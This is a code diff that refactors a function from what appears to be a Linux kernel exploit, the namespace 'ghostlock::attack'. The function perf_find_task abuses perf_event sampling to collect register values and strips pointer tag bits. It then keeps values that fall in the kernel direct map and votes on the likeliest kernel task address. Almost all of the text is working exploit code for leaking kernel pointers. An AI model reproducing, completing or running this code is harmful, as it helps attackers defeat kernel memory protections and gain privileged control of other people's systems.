@@ -12,6 +12,7 @@
 #include "profile/macros.h"
 #include "session/exploit_session.hpp"
 
+#include <algorithm>
 #include <array>
 #include <string>
 #include <string_view>
@@ -434,8 +435,7 @@ namespace ghostlock::attack {
 
     /* Find a task through perf sample records. */
     uintptr_t perf_find_task(void) {
-        struct perf_event_attr pe;
-        memset(&pe, 0, sizeof(pe));
+        struct perf_event_attr pe{};
         pe.type = PERF_TYPE_SOFTWARE;
         pe.size = sizeof(pe);
         pe.config = PERF_COUNT_SW_CPU_CLOCK;
@@ -453,7 +453,10 @@ namespace ghostlock::attack {
             pr_warning("perf_event_open failed errno=%d\n", errno);
             return 0;
         }
-        size_t msz = 4096 * (1 + 32); // NOLINT(bugprone-implicit-widening-of-multiplication-result)
+        constexpr size_t kPerfPageSize = 4096;
+        constexpr size_t kPerfDataPages = 32;
+        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
+        const size_t msz = kPerfPageSize + kPerfDataSize;
         void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
         if (mapped == MAP_FAILED) {
             pr_warning("perf mmap failed errno=%d\n", errno);
@@ -466,16 +469,15 @@ namespace ghostlock::attack {
         for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
         ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
         auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
-        uint64_t head = hdr->data_head;
-        __sync_synchronize();
-        char *base = reinterpret_cast<char *>(buf.data()) + 4096;
-        size_t dsz = 4096 * 32; // NOLINT(bugprone-implicit-widening-of-multiplication-result)
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
         uint64_t pos = hdr->data_tail;
-        uintptr_t cands[256];
+        std::array<uintptr_t, 256> cands{};
         int32_t nc = 0;
-        while (pos < head && nc < 256) {
+        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
             auto *ev = reinterpret_cast<struct perf_event_header *>(
-                base + (pos % dsz));
+                base + (pos % kPerfDataSize));
             if (ev->size == 0) break;
             if (ev->type == PERF_RECORD_SAMPLE) {
                 char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
@@ -484,12 +486,12 @@ namespace ghostlock::attack {
                 p += 8;
                 if (abi == 1 || abi == 2) {
                     uint64_t *regs = reinterpret_cast<uint64_t *>(p);
-                    for (int32_t i = 0; i < 32 && nc < 256; i++) {
+                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                         uint64_t v = regs[i];
                         /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                         v |= 0x0fULL << 56;
                         if (in_direct_map(v))
-                            cands[nc++] = v;
+                            cands[static_cast<size_t>(nc++)] = v;
                     }
                 }
             }
@@ -500,11 +502,12 @@ namespace ghostlock::attack {
         uintptr_t best = 0;
         int32_t best_cnt = 0;
         for (int32_t i = 0; i < nc; i++) {
-            int32_t cnt = 0;
-            for (int32_t j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
+            const auto at = cands[static_cast<size_t>(i)];
+            const int32_t cnt = static_cast<int32_t>(
+                std::count(cands.begin(), cands.begin() + nc, at));
             if (cnt > best_cnt) {
                 best_cnt = cnt;
-                best = cands[i];
+                best = at;
             }
         }
         pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
